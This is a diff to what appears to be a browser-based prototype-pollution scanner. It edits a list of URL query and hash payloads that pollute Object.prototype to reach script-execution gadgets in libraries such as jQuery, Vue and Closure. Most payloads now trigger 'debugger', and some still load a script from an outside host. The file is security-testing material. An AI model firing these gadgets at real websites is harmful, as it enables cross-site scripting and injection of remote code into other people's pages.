@@ -8,36 +8,36 @@ var PAYLOADS = [
 ];
 
 var GADGETS = [
-    '__proto__[innerHTML]=<img/src/onerror=ppscan()>',
-    '__proto__[context]=<img/src/onerror%3dppscan()>&__proto__[jquery]=x',
-    '__proto__[url][]=data:,ppscan()//&__proto__[dataType]=script',
-    '__proto__[url]=data:,ppscan()//&__proto__[dataType]=script&__proto__[crossDomain]=',
-    '__proto__[src][]=data:,ppscan()//',
-    '__proto__[url]=data:,ppscan()//',
-    '__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3dppscan()>&__proto__[div][2]=1',
-    '__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dppscan()>',
-    '__proto__[srcdoc][]=<script>ppscan()</script>',
-    '__proto__[hif][]=javascript:ppscan()',
+    '__proto__[innerHTML]=<img/src/onerror=debugger>',
+    '__proto__[context]=<img/src/onerror%3ddebugger>&__proto__[jquery]=x',
+    '__proto__[url][]=data:,debugger//&__proto__[dataType]=script',
+    '__proto__[url]=data:,debugger//&__proto__[dataType]=script&__proto__[crossDomain]=',
+    '__proto__[src][]=data:,debugger//',
+    '__proto__[url]=data:,debugger//',
+    '__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3ddebugger>&__proto__[div][2]=1',
+    '__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3ddebugger>',
+    '__proto__[srcdoc][]=<script>debugger</script>',
+    '__proto__[hif][]=javascript:debugger',
     '__proto__[attrs][src]=1&__proto__[src]=//p6.is/ppscan.php',
     '__proto__[BOOMR]=1&__proto__[url]=//p6.is/ppscan.php',
-    '__proto__[sourceURL]=%E2%80%A8%E2%80%A9ppscan()',
-    '__proto__[innerText]=<script>ppscan()</script>',
-    '__proto__[CLOSURE_BASE_PATH]=data:,ppscan()//',
-    '__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=ppscan()',
-    '__proto__[src]=data:,ppscan()//',
-    '__proto__[xxx]=ppscan()',
-    '__proto__[onload]=ppscan()',
-    '__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3dppscan()>&__proto__[script][2]=1',
-    "__proto__[4]=a':1,[ppscan()]:1,'b&__proto__[5]=,",
-    '__proto__[onerror]=ppscan()',
-    '__proto__[div][intro]=<img%20src%20onerror%3dppscan()>',
-    "__proto__[v-if]=_c.constructor('ppscan()')()",
-    '__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,ppscan()//&__proto__[is]=script',
-    "__proto__[v-bind:class]=''.constructor.constructor('ppscan()')()",
-    '__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>ppscan()</script>',
-    `__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('ppscan()')(),"`,
-    '__proto__[template]=<script>ppscan()</script>',
-    '__proto__[srcdoc]=<script>ppscan()</script>',
+    '__proto__[sourceURL]=%E2%80%A8%E2%80%A9debugger',
+    '__proto__[innerText]=<script>debugger</script>',
+    '__proto__[CLOSURE_BASE_PATH]=data:,debugger//',
+    '__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=debugger',
+    '__proto__[src]=data:,debugger;debugger//',
+    '__proto__[xxx]=debugger',
+    '__proto__[onload]=debugger',
+    '__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3ddebugger>&__proto__[script][2]=1',
+    "__proto__[4]=a':1,[debugger]:1,'b&__proto__[5]=,",
+    '__proto__[onerror]=debugger',
+    '__proto__[div][intro]=<img%20src%20onerror%3ddebugger>',
+    "__proto__[v-if]=_c.constructor('debugger')()",
+    '__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,debugger//&__proto__[is]=script',
+    "__proto__[v-bind:class]=''.constructor.constructor('debugger')()",
+    '__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>debugger</script>',
+    `__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('debugger')(),"`,
+    '__proto__[template]=<script>debugger</script>',
+    '__proto__[srcdoc]=<script>debugger</script>',
     '__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//p6.is/ppscan.php',
 ];
 
@@ -54,7 +54,7 @@ window.addEventListener('message', function(event) {
                         target_url.search = GADGETS[idx];
                         iframe.name = "ppdeadbeef1"
                         iframe.src = target_url;
-                        console.log(`[search:${idx}] `, target_url.href);
+                        console.log(`[search:${+idx + 1}] `, target_url.href);
                         document.documentElement.appendChild(iframe);
                     }, 500 * idx);
                 } else {
@@ -65,7 +65,7 @@ window.addEventListener('message', function(event) {
                         target_url.hash = GADGETS[idx];
                         iframe.name = "ppdeadbeef1"
                         iframe.src = target_url;
-                        console.log(`[hash:${idx}] `, target_url.href);
+                        console.log(`[hash:${+idx + 1}] `, target_url.href);
                         document.documentElement.appendChild(iframe);
                     }, 500 * idx);
                 }
